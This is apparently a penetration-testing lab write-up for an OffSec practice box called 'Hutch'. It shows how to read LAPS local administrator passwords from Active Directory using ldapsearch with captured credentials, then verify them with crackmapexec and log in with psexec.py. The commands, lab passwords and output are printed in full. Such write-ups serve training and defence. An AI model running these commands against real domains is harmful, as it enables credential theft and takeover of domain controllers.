---
description: Exploiting misconfigured LAPS service.
---

# Misconfigured LDAP

```
C:\Program Files\LAPS>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0A26-9DC1
 Directory of C:\Program Files\LAPS

11/03/2020  10:59 PM    <DIR>          .
11/03/2020  10:59 PM    <DIR>          ..
09/22/2016  09:02 AM            64,664 AdmPwd.UI.exe
09/22/2016  09:02 AM            33,952 AdmPwd.Utils.dll
11/03/2020  10:59 PM    <DIR>          CSE
               2 File(s)         98,616 bytes
               3 Dir(s)  13,020,606,464 bytes free
```

Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the ms-Mcs-AdmPwd attribute.

```
$ ldapsearch -x -h 192.168.99.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 

# extended LDIF
#
# LDAPv3
# base <dc=hutch,dc=offsec> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: k)zu03O#915M7K

# search reference
ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

We can see for the domain controller the LAPS password set is **k)zu03O#915M7K**

I then confirmed the credentials with crackmapexec against LDAP using the local administrator account and was given successful confirmation.

```
$ crackmapexec ldap 192.168.99.122 -d hutch.offsec -u administrator -p 'k)zu03O#915M7K' --kdcHost 192.168.99.122
LDAP        192.168.99.122  389    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
LDAP        192.168.99.122  389    HUTCHDC          [+] hutch.offsec\administrator:k)zu03O#915M7K
```

```
$ psexec.py hutch.offsec/administrator@192.168.99.122                         1 ⨯
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
Password: k)zu03O#915M7K
```
